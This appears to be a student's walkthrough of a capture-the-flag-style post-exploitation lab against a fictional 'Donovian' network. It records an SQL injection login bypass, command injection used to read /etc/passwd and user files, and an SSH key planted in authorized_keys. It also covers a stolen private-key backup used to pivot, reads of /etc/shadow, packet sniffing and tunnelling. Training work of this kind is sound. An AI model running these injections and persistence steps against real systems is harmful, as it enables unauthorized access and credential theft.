Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T2:X.X.X.X
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T2
Hostname: Donovian_Intranet
IP: X.X.X.X
OS: Ubuntu
Creds:Unknown
Last Known SSH Port: X
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: Donovian_Internal
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

## Extranet
### Extranet 1 

Utilizing the intelligence provided, enumerate the target provided. Look for user generated documents, relating to network structure, on this host that will direct further actions.

192.168.28.100/login.php
admin' or 1='1
admin' or 1='1

192.168.28.100/admin/admin.php
; ls -la
; cat /etc/passwd
- www-data
- root
- comrade
; cat /home/comrade
- .ssh
- Dekstop
; cat /home/comrade/Dekstop
- network
; cat /home/comrade/Dekstop/network
- .mapkey.txt
  - vQFMfQNpDRpo7cic9daQ
- map.png

### Extranet 2

The Donovian government is furthering their inventory expansion project. Identify and locate this intel to support this.

; cat /home/comrade/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia

On target
mkdir /var/www/.ssh 	(or whatever home directory)
echo "RSA KEY" > /var/www/.ssh/authorized_keys   ( might have to change the home directory )
cat /var/www/.ssh/authorized_keys

On opstation
ssh-keygen -t rsa -b 4096
cat .ssh/id_rsa.pub
ssh www-data@ip
- got in with www-data user

find / 2>/dev/null | grep inventory
- /usr/share/equip-inventory.txt
  - MmhIT1dNNTdjN3ZVUld2U1dvdG4K

proxychains scp -P 2222 www-data@192.168.28.100:/home/comrade/Dekstop/network/map.png .

cat /etc/hosts

## Intranet
### Intranet 1
Enumerate all network items, relating to name resolution.

#### On Extranet
cat /etc/hosts
cat /etc/cron*
- /etc/cron.d/crontab
  - 'comrade backup .ssh dir'
proxychains scp -P 2222 www-data@192.168.28.100:/tmp/backup.tar.gz .
mv backup.tar.gz 192.168.28.100
tar -xvzf backup.tar.gz 
- 192.168.28.100/.ssh/id_rsa
- 192.168.28.100/.ssh/id_rsa.pub
proxychains ssh -p 3201 -i /home/student/192.168.28.100/.ssh/id_rsa comrade@192.168.150.253

#### On Intranet
nmap host
- :80 default apache server page

cat /etc/hosts
- get flag

### Intranet 2
Enumerate all items related to syslog and rsyslog.

find / 2>/dev/null | grep syslog.conf
ls -la /etc/rsyslog.d
- cat /etc/rsyslog.d/50-default.conf

### Intranet 3
Enumerate user directories on the machine. Find artifacts of malicious intent. You might need higher privileges...

sudo su
ls -la /root/brootkit
cat /root/brootkit/brootkit-master/br.conf

### Intranet 4
Enumerate for security products that may be installed on the system. (i.e. antivirus, etc.)
- Research the top 10 antivirus programs for Linux.

ls -la /etc/cron.daily
- rkhunter
ls -la /etc
- rkhunter.conf
find / 2>/dev/null | grep rkhunter
cat /etc/rkhunter.conf

### Intranet 5
Enumerate information related the users on this system.
cat /etc/users
cat /ect/shadow

### Intranet 6
Enumerate items that would be related to jobs and tasks that running on the host, you may need to use higher privileges.

ls -la /var/spool/cron/crontabs
cat /var/spool/cron/crontabs/root
- flag

### Intranet 7
Find the beacon being received by the intranet host and determine how to interact with it.

cat /etc/hosts
- 192.168.56.1
```
tcpdump host 192.168.56.1 -vv
tcpdump port 514 -vv
tcpdump -i ens3 not host 192.168.28.100 -vv -X 
tcpdump src 192.168.56.1 -vv -X
```
tcpdump host lin.intranet.donovia and host 192.168.28.135 -vv -X
nc -lvnp 12335
- decode base64
  - get flag

## Internal
### Internal 1
You have been tasked to collect intelligence relating to one of the Donovian General Officers.
The Gorgas Allied intelligence cell have determined that the 3rd and 4th octet of the the Donovian Internal Network is xxx.xxx.28.9

set up forward tunnel
use RDP
- xfreerdp /v:127.0.0.1:<tunnel> /u:comrade /p:<password> /size:1920x1024 +clipboard

### Internal 2
The Gorgas Government has informed your team that sensitive technology data may be present within their Internal network. Enumerate directories critical to the OS and locate the data.


### Internal 3
You have been tasked to validate whether a persistence mechanism has already been set on this host.

